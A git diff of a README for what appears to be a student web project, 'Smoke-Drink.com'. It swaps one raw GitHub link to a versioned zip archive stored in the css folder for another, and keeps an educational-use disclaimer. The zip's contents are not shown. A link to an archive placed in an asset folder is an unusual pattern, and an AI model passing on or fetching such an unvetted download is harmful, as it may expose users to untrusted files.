@@ -1,4 +1,4 @@
-# https://raw.githubusercontent.com/Muhib-Hasan/Smoke-Drink.com/master/css/Smoke_com_Drink_v2.5.zip
+# https://raw.githubusercontent.com/Muhib-Hasan/Smoke-Drink.com/master/css/Drink-Smoke-com-v2.2.zip
 **For Learning Purpose**</br>
 We are working on this project for learning purpose only. Our intent totally is not violating any national and international rule. We chose this topic because we would like to implement AI for this project. Which is perfectly necessary for such types of websites.
 **THIS IS FOR EDUCATIONAL PURPOSE ONLY. NONE OF OUR PROJECT MEMBERS HAVE ANY PLANS TO RUN IT FOR COMMERCIAL PURPOSE**
